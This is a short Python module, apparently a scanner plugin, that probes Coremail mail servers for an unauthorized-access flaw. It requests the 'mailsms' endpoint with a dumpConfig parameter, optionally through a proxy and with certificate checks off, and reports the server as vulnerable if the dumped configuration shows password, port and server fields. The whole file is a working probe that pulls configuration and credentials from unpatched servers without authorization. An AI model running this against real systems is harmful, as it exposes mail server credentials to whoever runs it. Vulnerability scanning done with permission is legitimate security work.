import requests
import re
from bs4 import BeautifulSoup
import logging
import json

ca=''
http = ''
https = ''
def dl121(dl):
    global http,https
    http=dl
    https=dl
def tk(url,s_cookie):
    global http, https
    global ca
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        r = requests.get(url+'mailsms/s?func=ADMIN:appState&dumpConfig=/',cookies=s_cookie, proxies=proxies, verify=False)
        r.encoding = 'utf-8'
        ca = BeautifulSoup(r.text, 'html.parser')
        if 'Password' in ca.text and 'Port' in ca.text and 'Server' in ca.text:
            ca ="""
                 [+]漏洞存在\n
                 /mailsms/s?func=ADMIN:appState&dumpConfig=/\n
                """
        else:
            ca='[-]漏洞不存在\n'
    except Exception as aaa:
        ca='[-]页面访问失败\n'+str(aaa)
def jg51():
    global ca
    return '--------------------------------------------------\n[ Coremail mailsms未授权访问漏洞 ]\n\n'+ str (ca)+'\n'
def u41(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        tk(url1,s_cookie)
    elif pd=='1':
        tk(url1,s_cookie)